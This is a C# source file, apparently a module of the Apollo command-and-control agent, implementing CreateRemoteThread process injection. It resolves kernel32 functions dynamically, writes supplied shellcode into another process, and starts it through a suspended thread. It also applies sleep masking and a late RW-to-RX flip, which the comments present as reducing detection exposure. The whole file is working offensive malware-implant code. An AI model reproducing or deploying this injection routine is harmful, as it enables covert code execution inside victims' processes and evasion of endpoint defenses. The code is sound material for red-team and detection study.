using ApolloInterop.Classes.Api;
using ApolloInterop.Classes.Core;
using ApolloInterop.Interfaces;
using System;
using static Injection.Shared.Win32;

namespace Injection.Techniques.CreateRemoteThread
{
    public class CreateRemoteThread : InjectionTechnique
    {
        private delegate IntPtr VirtualAllocEx(
           IntPtr hProcess,
           IntPtr lpAddress,
           ulong dwSize,
           AllocationType flAllocationType,
           MemoryProtection flProtect);
        private delegate bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            uint nSize,
            out uint lpNumberOfBytesWritten);
        private delegate bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);
        private delegate IntPtr CRT(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            IntPtr lpThreadId);
        private delegate int ResumeThread(IntPtr hThread);

        private VirtualAllocEx _pVirtualAllocEx;
        private WriteProcessMemory _pWriteProcessMemory;
        private CRT _pCreateRemoteThread;
        private VirtualProtectEx _pVirtualProtectEx;
        private ResumeThread _pResumeThread;

        public CreateRemoteThread(IAgent agent, byte[] code, int pid) : base(agent, code, pid)
        {
            GetFunctionPointers();
        }

        public CreateRemoteThread(IAgent agent, byte[] code, IntPtr hProcess) : base(agent, code, hProcess)
        {
            GetFunctionPointers();
        }

        private void GetFunctionPointers()
        {
            _pVirtualAllocEx = _agent.GetApi().GetLibraryFunction<VirtualAllocEx>(Library.KERNEL32, "VirtualAllocEx");
            _pWriteProcessMemory = _agent.GetApi().GetLibraryFunction<WriteProcessMemory>(Library.KERNEL32, "WriteProcessMemory");
            _pCreateRemoteThread = _agent.GetApi().GetLibraryFunction<CRT>(Library.KERNEL32, "CreateRemoteThread");
            _pVirtualProtectEx = _agent.GetApi().GetLibraryFunction<VirtualProtectEx>(Library.KERNEL32, "VirtualProtectEx");
            _pResumeThread = _agent.GetApi().GetLibraryFunction<ResumeThread>(Library.KERNEL32, "ResumeThread");
        }

        public override bool Inject(string arguments = "")
        {
            bool bRet = true;
            IntPtr remoteThread = IntPtr.Zero;
            try
            {
                uint bytesWritten = 0;
                IntPtr allocSpace = _pVirtualAllocEx(
                    _hProcess,
                    IntPtr.Zero,
                    (ulong)_code.Length,
                    AllocationType.Commit | AllocationType.Reserve,
                    MemoryProtection.ReadWrite);
                if (allocSpace == IntPtr.Zero)
                {
                    bRet = false;
                }
                else
                {
                    bRet = _pWriteProcessMemory(_hProcess, allocSpace, _code, (uint)_code.Length, out bytesWritten);
                    if (bRet)
                    {
                        // Create thread SUSPENDED while memory is still RW
                        remoteThread = _pCreateRemoteThread(_hProcess, IntPtr.Zero, 0, allocSpace, IntPtr.Zero, 0x4 /* CREATE_SUSPENDED */, IntPtr.Zero);
                        if (remoteThread == IntPtr.Zero)
                        {
                            bRet = false;
                        }
                        else
                        {
                            // Register for sleep masking before the thread ever runs
                            RegisterSleepMaskRegion(allocSpace, _code.Length);

                            // Now flip to RX and resume - minimal exposure window
                            uint flOldProtect = 0;
                            _pVirtualProtectEx(_hProcess, allocSpace, (uint)_code.Length, (uint)MemoryProtection.ExecuteRead, out flOldProtect);
                            _pResumeThread(remoteThread);
                            bRet = true;
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                bRet = false;
            }
            finally
            {
                if (remoteThread != IntPtr.Zero)
                {
                    _pCloseHandle(remoteThread);
                }
            }
            return bRet;
        }
    }
}
